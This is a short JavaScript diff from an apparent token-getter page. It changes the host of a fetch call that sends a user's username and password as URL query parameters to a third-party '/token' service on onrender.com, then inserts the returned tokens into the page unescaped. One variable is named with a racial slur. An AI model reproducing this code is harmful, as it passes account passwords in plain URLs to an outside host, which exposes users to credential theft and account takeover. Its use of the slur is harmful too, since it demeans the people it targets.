@@ -26,7 +26,7 @@ async function submitForm() {
    try {
      button.style.display = 'none';
      nigga.style.display = 'block';
-     const response = await fetch('https://nethwieapi.koyeb.app/token'
+     const response = await fetch('https://nethwieapi.onrender.com/token'
      + `?u=${iyot[0] ? iyot[0] : ``}&p=${iyot[1] ? iyot[1] : ``}`);
      const data = await response.json();
      const _123_ = `Message: ${data.message}<br><pre>${data.token1}</pre><pre>${data.token2}</pre><pre>${data.token3}</pre>`;
